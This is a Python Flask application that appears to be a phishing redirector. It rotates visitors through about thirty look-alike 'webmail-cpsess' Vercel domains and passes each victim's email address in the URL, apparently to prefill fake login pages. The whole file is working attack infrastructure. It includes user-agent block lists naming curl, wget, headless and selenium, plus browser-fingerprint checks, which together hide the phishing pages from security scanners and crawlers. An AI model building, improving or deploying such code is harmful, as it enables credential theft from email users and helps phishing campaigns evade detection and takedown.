from flask import Flask, redirect, request, render_template_string, make_response
import os
import time
import hashlib
import json

app = Flask(__name__)
application = app

DOMAINS = [
    'https://webmail-cpsess-super-duper-journey.vercel.app',
    'https://webmail-cpsess-super-duper-journey-zeta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-woad.vercel.app',
    'https://webmail-cpsess-super-duper-journey-phi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-puce.vercel.app',
    'https://webmail-cpsess-super-duper-journey-xi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-ruby.vercel.app',
    'https://webmail-cpsess-super-duper-journey-six.vercel.app',
    'https://webmail-cpsess-super-duper-journey-delta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-five.vercel.app',
    'https://webmail-cpsess-super-duper-journey-lime.vercel.app',
    'https://webmail-cpsess-super-duper-journey-rosy.vercel.app',
    'https://webmail-cpsess-super-duper-journey-psi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-lake.vercel.app',
    'https://webmail-cpsess-super-duper-journey-tan.vercel.app',
    'https://webmail-cpsess-super-duper-journey-flame.vercel.app',
    'https://webmail-cpsess-super-duper-journey-eta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-one.vercel.app',
    'https://webmail-cpsess-super-duper-journey-ten.vercel.app',
    'https://webmail-cpsess-super-duper-journey-jade.vercel.app',
    'https://webmail-cpsess-super-duper-journey-chi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-pi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-sigma.vercel.app',
    'https://webmail-cpsess-super-duper-journey-beta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-snowy.vercel.app',
    'https://webmail-cpsess-super-duper-journey-gamma.vercel.app',
    'https://webmail-cpsess-super-duper-journey-woad-beta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-two.vercel.app',
    'https://webmail-cpsess-super-duper-journey-navy.vercel.app',
    'https://webmail-cpsess-super-duper-journey-eight.vercel.app'
]
# Session-based round robin tracking for efficiency
current_index = 0
REQUEST_LIMIT = 50  # Requests per second limit
request_timestamps = []

def is_bot_request(user_agent):
    """Basic bot detection based on user agent"""
    if not user_agent:
        return True
    
    bot_indicators = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 
        'python-requests', 'java', 'headless', 'phantom', 'selenium'
    ]
    
    ua_lower = user_agent.lower()
    return any(indicator in ua_lower for indicator in bot_indicators)

def is_rate_limited():
    """Simple rate limiting"""
    global request_timestamps
    current_time = time.time()
    
    # Clean old timestamps
    request_timestamps = [ts for ts in request_timestamps 
                         if current_time - ts < 1.0]
    
    if len(request_timestamps) >= REQUEST_LIMIT:
        return True
    
    request_timestamps.append(current_time)
    return False

def generate_browser_fingerprint(request):
    """Generate a simple browser fingerprint for validation"""
    user_agent = request.user_agent.string or ''
    accept_language = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    
    fingerprint_string = f"{user_agent}:{accept_language}:{accept_encoding}"
    return hashlib.md5(fingerprint_string.encode()).hexdigest()[:8]

@app.before_request
def pre_request_checks():
    """Perform checks before processing any request"""
    # Rate limiting check
    if is_rate_limited():
        return "Too many requests", 429
    
    # Bot detection
    if is_bot_request(request.user_agent.string):
        return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Verification Required</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; 
                              border-radius: 50%; width: 50px; height: 50px; 
                              animation: spin 2s linear infinite; margin: 20px auto; }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                </style>
            </head>
            <body>
                <h2>Verifying Browser...</h2>
                <div class="spinner"></div>
                <p>Please wait while we verify your browser.</p>
                
                <script>
                    // Advanced bot detection script
                    (function() {
                        const botTests = {
                            hasCookies: () => navigator.cookieEnabled,
                            hasLocalStorage: () => {
                                try { return !!window.localStorage; } catch(e) { return false; }
                            },
                            hasSessionStorage: () => {
                                try { return !!window.sessionStorage; } catch(e) { return false; }
                            },
                            hasWebGL: () => {
                                try {
                                    const canvas = document.createElement('canvas');
                                    return !!(window.WebGLRenderingContext && 
                                            (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
                                } catch(e) { return false; }
                            },
                            hasPlugins: () => navigator.plugins && navigator.plugins.length > 0,
                            isHeadless: () => {
                                // Check for headless browser indicators
                                return !navigator.webdriver ? false : true;
                            },
                            screenResolution: () => {
                                return window.screen.width > 0 && window.screen.height > 0;
                            },
                            colorDepth: () => window.screen.colorDepth >= 24,
                            timezone: () => Intl.DateTimeFormat().resolvedOptions().timeZone !== undefined,
                            languages: () => navigator.languages && navigator.languages.length > 0
                        };
                        
                        let score = 0;
                        let totalTests = 0;
                        
                        for (const test in botTests) {
                            totalTests++;
                            if (botTests[test]()) score++;
                        }
                        
                        const fingerprint = {
                            score: (score / totalTests * 100).toFixed(2),
                            tests: totalTests,
                            passed: score,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: `${window.screen.width}x${window.screen.height}`,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            timestamp: Date.now()
                        };
                        
                        // Store fingerprint in sessionStorage
                        sessionStorage.setItem('browser_fingerprint', JSON.stringify(fingerprint));
                        
                        // Send fingerprint to server
                        fetch('/verify-browser', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(fingerprint)
                        }).then(response => {
                            if (response.ok) {
                                // Retry original request
                                const originalUrl = window.location.pathname + window.location.search;
                                window.location.href = originalUrl;
                            } else {
                                document.body.innerHTML = '<h2>Access Denied</h2><p>Browser verification failed.</p>';
                            }
                        }).catch(error => {
                            document.body.innerHTML = '<h2>Verification Error</h2><p>Please try again.</p>';
                        });
                    })();
                </script>
            </body>
            </html>
        '''), 403

@app.route('/verify-browser', methods=['POST'])
def verify_browser():
    """Endpoint to verify browser fingerprint"""
    try:
        data = request.json
        if not data:
            return {"status": "error", "message": "Invalid data"}, 400
        
        # Check fingerprint score (minimum 70% pass rate)
        score = float(data.get('score', 0))
        if score >= 70:
            # Set verification cookie
            response = make_response({"status": "success", "message": "Browser verified"})
            response.set_cookie('browser_verified', 'true', max_age=300, httponly=True)
            return response
        else:
            return {"status": "failed", "message": "Browser verification failed"}, 403
    except:
        return {"status": "error", "message": "Verification error"}, 500

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Check if browser is verified
    if not request.cookies.get('browser_verified'):
        # Serve verification page
        return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Verification Required</title>
                <meta http-equiv="refresh" content="2;url=/verify">
            </head>
            <body>
                <p>Redirecting to verification...</p>
            </body>
            </html>
        ''')
    
    # Try to get email from query parameter first
    email = request.args.get('web', '')
    
    # If no query parameter, handle hash fragment
    if not email:
        return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Email Redirect</title>
                <script>
                    (function() {
                        // Process hash fragment
                        if (window.location.hash) {
                            let email = window.location.hash.substring(1);
                            if (email.includes('@')) {
                                // Preserve any additional parameters
                                const params = new URLSearchParams(window.location.search);
                                params.set('web', email);
                                const newUrl = window.location.pathname + '?' + params.toString();
                                window.location.href = newUrl;
                            }
                        } else {
                            document.body.innerHTML = '<h2>Email Required</h2><p>Please provide an email address.</p>';
                        }
                    })();
                </script>
            </head>
            <body>
                <p>Processing request...</p>
            </body>
            </html>
        ''')
    
    # Validate email format
    if not email or '@' not in email or '.' not in email:
        return "Invalid email address format.", 400
    
    # Get target domain using round-robin
    target_domain = DOMAINS[current_index]
    
    # Update index for next request (thread-safe increment)
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL
    target_url = f"{target_domain}/?web={email}"
    
    # Add cache control headers for efficiency
    response = redirect(target_url, code=302)
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    
    return response

@app.route('/verify')
def verification_page():
    """Standalone verification page"""
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Browser Verification</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
                .container { text-align: center; }
                .status { margin: 20px 0; padding: 15px; border-radius: 5px; }
                .verifying { background: #fff3cd; border: 1px solid #ffeaa7; }
                .success { background: #d4edda; border: 1px solid #c3e6cb; }
                .error { background: #f8d7da; border: 1px solid #f5c6cb; }
                button { padding: 10px 20px; background: #007bff; color: white; 
                        border: none; border-radius: 4px; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Browser Verification</h2>
                <div id="status" class="status verifying">
                    Running browser compatibility checks...
                </div>
                <button onclick="runVerification()" id="retryBtn" style="display:none;">
                    Retry Verification
                </button>
            </div>
            
            <script>
                function runVerification() {
                    const status = document.getElementById('status');
                    const retryBtn = document.getElementById('retryBtn');
                    
                    status.className = 'status verifying';
                    status.innerHTML = 'Running browser compatibility checks...';
                    retryBtn.style.display = 'none';
                    
                    // Run verification tests
                    const tests = {
                        cookies: () => navigator.cookieEnabled,
                        javascript: () => true,
                        localStorage: () => {
                            try { localStorage.setItem('test', 'test'); localStorage.removeItem('test'); return true; }
                            catch(e) { return false; }
                        },
                        screen: () => window.screen.width > 0 && window.screen.height > 0,
                        userAgent: () => navigator.userAgent && navigator.userAgent.length > 0
                    };
                    
                    let passed = 0;
                    let total = 0;
                    
                    for (const [name, test] of Object.entries(tests)) {
                        total++;
                        if (test()) passed++;
                    }
                    
                    const score = (passed / total * 100).toFixed(2);
                    
                    if (score >= 70) {
                        // Set verification cookie and redirect
                        document.cookie = 'browser_verified=true; max-age=300; path=/';
                        status.className = 'status success';
                        status.innerHTML = `✓ Verification passed (${score}%)`;
                        setTimeout(() => {
                            window.location.href = '/';
                        }, 1000);
                    } else {
                        status.className = 'status error';
                        status.innerHTML = `✗ Verification failed (${score}%). Please use a standard web browser.`;
                        retryBtn.style.display = 'block';
                    }
                }
                
                // Auto-run verification on page load
                document.addEventListener('DOMContentLoaded', runVerification);
            </script>
        </body>
        </html>
    ''')

@app.errorhandler(404)
def not_found(error):
    return redirect('/')

@app.errorhandler(429)
def ratelimit_handler(error):
    return "Too many requests. Please try again later.", 429

if __name__ == '__main__':
    # Production settings
    app.run(
        host='0.0.0.0',
        port=int(os.environ.get('PORT', 5000)),
        debug=False,
        threaded=True  # Enable threading for concurrent requests
    )
